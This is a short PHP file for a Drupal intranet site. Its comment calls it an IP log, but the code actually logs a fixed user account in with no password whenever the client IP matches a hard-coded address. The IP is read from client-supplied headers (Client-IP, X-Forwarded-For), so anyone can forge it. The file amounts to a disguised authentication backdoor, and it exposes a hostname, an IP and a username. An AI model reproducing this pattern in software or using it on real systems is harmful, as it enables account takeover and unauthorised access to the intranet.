<?php
define('DRUPAL_ROOT', '/var/www/intranet.ishoj.dk/public_html');
require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);

// IP LOG
// ?internref=8d75f6d9265f84ac20b911134ae6c911
$ipadd = '';

if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ipadd=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ipadd=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ipadd=$_SERVER['REMOTE_ADDR'];
    }

if ($ipadd == '212.130.64.114') {

$user_objrem = user_load('jvm');
$form_state = array();
$form_state['uid'] = $user_objrem->uid;      
user_login_submit(array(), $form_state);     
    
} 
?>